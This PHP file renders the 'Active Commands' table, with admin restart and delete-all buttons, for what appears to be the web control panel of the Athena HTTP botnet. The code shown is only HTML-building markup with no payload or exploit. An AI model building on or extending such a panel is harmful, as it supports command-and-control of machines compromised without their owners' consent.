<?php

	if(!defined('AthenaHTTP')) header('Location: ..');

	$PAGE_INCLUDE = '';
	
	require_once './include/inc_activecommands.php';
		
	if($STATUS_NOTE)
	{
		$PAGE_INCLUDE .= '			<div class="content small">' . "\n";
		$PAGE_INCLUDE .= '				<span class="title"> </span>' . "\n";
		$PAGE_INCLUDE .= '				<p>' . "\n";
		$PAGE_INCLUDE .= '					' . $STATUS_MESSAGE . "\n";
		$PAGE_INCLUDE .= '				</p>' . "\n";
		$PAGE_INCLUDE .= '			</div>' . "\n";
	}
	
	$PAGE_INCLUDE .= '			<div class="content">' . "\n";
	$PAGE_INCLUDE .= '				<span class="title">Active Commands</span>' . "\n";
	$PAGE_INCLUDE .= '				<table>' . "\n";
	$PAGE_INCLUDE .= '					<tr>' . "\n";
	$PAGE_INCLUDE .= '						<th>Command ID</th>' . "\n";
	$PAGE_INCLUDE .= '						<th>Creator</th>' . "\n";
	$PAGE_INCLUDE .= '						<th>Command</th>' . "\n";
	$PAGE_INCLUDE .= '						<th>Parameter(s)</th>' . "\n";
	$PAGE_INCLUDE .= '						<th>Executions</th>' . "\n";
	$PAGE_INCLUDE .= '						<th></th>' . "\n";
	$PAGE_INCLUDE .= '					</tr>' . "\n";
	$PAGE_INCLUDE .= $PAGE_INCLUDE_TASKLIST;
	$PAGE_INCLUDE .= '					<tr>' . "\n";
	$PAGE_INCLUDE .= '						<td></td>' . "\n";
	$PAGE_INCLUDE .= '						<td></td>' . "\n";
	$PAGE_INCLUDE .= '						<td></td>' . "\n";
	$PAGE_INCLUDE .= '						<td></td>' . "\n";
	$PAGE_INCLUDE .= '						<td></td>' . "\n";
	$PAGE_INCLUDE .= '						<td></td>' . "\n";
	$PAGE_INCLUDE .= '					</tr>' . "\n";
	$PAGE_INCLUDE .= '				</table>' . "\n";
	
	if($USERINFO['admin'])
	{
		$PAGE_INCLUDE .= '				<span class="foot">' . "\n";
		$PAGE_INCLUDE .= '					<input onClick="navigateTo(\'./index.php?p=tasks&all=r\');" type="button" value="Restart All" />' . "\n";
		$PAGE_INCLUDE .= '					<input onClick="navigateTo(\'./index.php?p=tasks&all=c\');" type="button" value="Delete All" />' . "\n";
		$PAGE_INCLUDE .= '				</span>' . "\n";
	}
	
	$PAGE_INCLUDE .= '			</div>' . "\n";

?>